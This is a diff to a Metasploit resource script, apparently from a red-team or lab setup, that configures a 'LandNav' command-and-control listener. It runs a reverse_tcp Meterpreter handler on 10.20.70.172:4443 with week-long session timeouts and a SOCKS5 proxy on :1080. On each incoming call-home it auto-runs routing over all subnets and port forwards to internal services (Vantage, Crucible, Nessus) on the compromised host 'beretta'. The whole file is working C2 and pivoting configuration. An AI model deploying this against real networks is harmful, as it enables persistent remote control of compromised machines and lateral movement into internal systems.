@@ -1,8 +1,14 @@
-# LandNav C2 Listener — auto-route + SOCKS on session
+# LandNav C2 Listener — auto-route + portfwd + SOCKS on session
 # Usage: msfconsole -r /opt/pr0t31n/LandNav/listener.rc
 #
-# Starts a python/meterpreter/reverse_tcp handler on :4443
-# and automatically sets up routing + SOCKS proxy when beretta connects.
+# Starts a python/meterpreter/reverse_tcp handler on :4443.
+# On session open, automatically:
+#   1. Adds routes for all subnets (autoroute)
+#   2. Port-forwards Vantage (5100), Crucible (5500), Nessus (8834)
+#
+# SOCKS proxy is available on :1080 but prefer the port forwards —
+# Python meterpreter is single-threaded and heavy SOCKS browsing
+# (especially WebSocket/SocketIO apps) starves the command channel.
 
 # ── SOCKS Proxy (start first so it's ready when session arrives) ──
 use auxiliary/server/socks_proxy
@@ -26,9 +32,9 @@ set ExitOnSession false
 set SessionCommunicationTimeout 3600
 set SessionExpirationTimeout 604800
 
-# Auto-run on every new session: add default route via post module
-# (multi_console_command loses quotes in .rc files — use the post module directly)
-set AutoRunScript post/multi/manage/autoroute SUBNET=0.0.0.0 NETMASK=0.0.0.0
+# Auto-run on session open: autoroute + portfwd from file
+# (avoids .rc quoting issues with multi_console_command -c)
+set AutoRunScript multi_console_command -r /opt/pr0t31n/LandNav/auto_commands.txt
 
 run -j
 
@@ -37,5 +43,14 @@ echo "════════════════════════�
 echo " LandNav listener active on 10.20.70.172:4443"
 echo " SOCKS5 proxy on :1080 (routes through sessions)"
 echo " Waiting for beretta call-home..."
+echo ""
+echo " On session open, auto-runs:"
+echo "   • autoroute (all subnets)"
+echo "   • portfwd 5100 → beretta:5100 (Vantage)"
+echo "   • portfwd 5500 → beretta:5500 (Crucible)"
+echo "   • portfwd 8834 → beretta:8834 (Nessus)"
+echo ""
+echo " Browse: http://c2-server:5100  http://c2-server:5500"
+echo "         https://c2-server:8834"
 echo "════════════════════════════════════════════════════"
 echo ""
